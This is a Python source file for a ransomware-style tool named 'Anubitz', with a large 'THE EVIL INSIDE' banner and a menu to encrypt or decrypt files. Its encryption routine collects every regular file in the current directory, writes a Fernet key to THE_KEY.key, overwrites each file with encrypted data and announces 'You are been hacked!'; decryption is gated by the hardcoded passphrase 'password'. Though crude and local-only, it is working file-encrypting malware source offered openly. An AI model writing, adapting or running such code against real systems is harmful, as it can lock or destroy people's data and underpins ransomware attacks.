import os
from subprocess import call
from colorama import init
from termcolor import colored
from cryptography.fernet import Fernet
import asyncio

init()
c = colored

BANNER = (fr"""
             .                                                      .
           .n                   .                 .                  n.
     .   .dP                  dP                   9b                 9b.    .
    4    qXb         .       dX                     Xb       .        dXp     t
   dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
   9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
    9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
     `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
       `9XXXXXXXXXXXP' `9XX'          `98v8P'         `XXP' `9XXXXXXXXXXXP'
           ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                           )b.  .dbo.dP'`v'`9b.odb.  .dX(
                         ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                        dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                       dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                       9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                        `'      9XXXXXX(   )XXXXXXP      `'
                                 XXXX X.`v'.X XXXX
                                 XP^X'`b   d'`X^XX
                                 X. 9  `   '  P )X
                                 `b  `       '  d'
                                  `             '
               L.             :                                                   
               EW:        ,ft Ef      .          t                                
            .. E##;       t#E E#t     Ef.        Ej GEEEEEEEL                     
           ;W, E###t      t#E E#t     E#Wi       E#,,;;L#K;;.   ,##############Wf.
          j##, E#fE#f     t#E E#t     E#K#D:     E#t   t#E       ........jW##Wt   
         G###, E#t D#G    t#E E#t fi  E#t,E#f.   E#t   t#E             tW##Kt     
       :E####, E#t  f#E.  t#E E#t L#j E#WEE##Wt  E#t   t#E           tW##E;       
      ;W#DG##, E#t   t#K: t#E E#t L#L E##Ei;;;;. E#t   t#E         tW##E;         
     j###DW##, E#t    ;#W,t#E E#tf#E: E#DWWt     E#t   t#E      .fW##D,           
    G##i,,G##, E#t     :K#D#E E###f   E#t f#K;   E#t   t#E    .f###D,             
  :K#K:   L##, E#t      .E##E E#K,    E#Dfff##E, E#t   t#E  .f####Gfffffffffff;   
 ;##D.    L##, ..         G#E EL      jLLLLLLLLL;E#t    fE .fLLLLLLLLLLLLLLLLLi   
 ,,,      .,,              fE :                  ,;.     :                        
                            ,    
                             ---- THE EVIL INSIDE ----
                                    | S3R43o3 |""")

class Anubitz():
    def __init__(self):
        self.encryption_key = ''
        self.is_encrypted = False
        self.is_decrypted = False
        self.files_to_encrypt = []
        self.files_to_decrypt = []
        self.clear = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
        self.options = {
            1: 'Encrypt files',
            2: 'Decrypt files',
            0: 'Exit'
        }

    async def menu(self):
        self.clear()

        print(c(BANNER, 'red', attrs=['bold']))
        print(c(rf'''
                               1) Encrypt Files
                               2) Decrypt Files

                               0) Exit''', 'red', attrs=['bold']))
        print('\n\n'+c('                Enter your choice: ', 'red', attrs=['bold']))
        choice = int(input('                                    '))   
        if choice not in self.options:
            print(c('Invalid choice', 'red', attrs=['bold']))
            await self.menu()
        if choice == 1:
            await self.run(os.getcwd())
        elif choice == 2:
            await self.decrypt_files()
        elif choice == 0:
            exit()

    async def run(self, path):
        await self.get_files_to_encrypt(path)
        await self.encrypt_files(self.files_to_encrypt, self.encryption_key)

    async def get_files_to_encrypt(self, path):
        files = []
        for file in os.listdir(path):
            if file == "anubitz.py" or file == 'THE_KEY.key':
                continue
            if os.path.isfile(file):
                files.append(file)
        self.files_to_encrypt = files
        print(c("Files to encrypt:", 'green', attrs=['bold']))
        for file in files:
            print(c(file, 'green', attrs=['bold']))
            await asyncio.sleep(0.3)
        print(files)
        await self.generate_key()

    async def generate_key(self):
        key = Fernet.generate_key()
        self.encryption_key = key
        with open("THE_KEY.key", "wb") as key_file:
            key_file.write(key)
        print(c("Key generated successfully", 'green', attrs=['bold']))

    async def encrypt_files(self, files, key):
        print(c("Encrypting files...", 'green', attrs=['bold']))
        for file in files:
            with open(file, 'rb') as crypt_file:
                data = crypt_file.read()
            encrypted_data = Fernet(key).encrypt(data)

            print(c("... write encrypted data to file ...", 'green', attrs=['bold']), file)
            await asyncio.sleep(0.8)
            with open(file, 'wb') as crypt_file:
                crypt_file.write(encrypted_data)
            await asyncio.sleep(0.8)
            print(c("... done", 'green', attrs=['bold']))
        print('\n\n')
        print(c("-------------------------------------------------------------------------------------", 'red', attrs=['bold']))
        print(c("                       Encryption complete. You are been hacked!                     ", 'red', attrs=['bold']))
        print(c("-------------------------------------------------------------------------------------", 'red', attrs=['bold']))

    async def decrypt_files(self):
        self.clear
        files = []
        for file in os.listdir():
            if file == 'anubitz.py' or file == 'THE_KEY.key':
                continue
            if os.path.isfile(file):
                files.append(file)
        print(files)
        with open("THE_KEY.key", 'rb') as decrypt_key:
            key = decrypt_key.read()
        
        passphrase = "password"
        user_phrase = input(c("Enter your passphrase: ", 'red', attrs=['bold']))
        if user_phrase != passphrase:
            print(c("Wrong passphrase", 'red', attrs=['bold']))
            exit()
        else:
            print(c("Decrypting files...", 'green', attrs=['bold']))
            for file in files:
                with open(file, 'rb') as decrypt_file:
                    data = decrypt_file.read()
                decrypted_data = Fernet(key).decrypt(data)
                
                print(c("... write encrypted data to file ...", 'green', attrs=['bold']), file)
                await asyncio.sleep(0.8)
                with open(file, 'wb') as decrypt_file:
                    decrypt_file.write(decrypted_data)
                await asyncio.sleep(0.8)
                print(c("... done", 'green', attrs=['bold']))
            await asyncio.sleep(2.0)
            print('\n\n')
            print(c("-------------------------------------------------------------------------------------", 'red', attrs=['bold']))
            print(c("                 Decryption complete. You can access your files now!                 ", 'red', attrs=['bold']))
            print(c("-------------------------------------------------------------------------------------", 'red', attrs=['bold']))
            exit(0)
            
async def main():
    try:
        anubitz = Anubitz()
        await anubitz.menu()
    except KeyboardInterrupt:
        exit()

if __name__ == '__main__':
    asyncio.run(main())

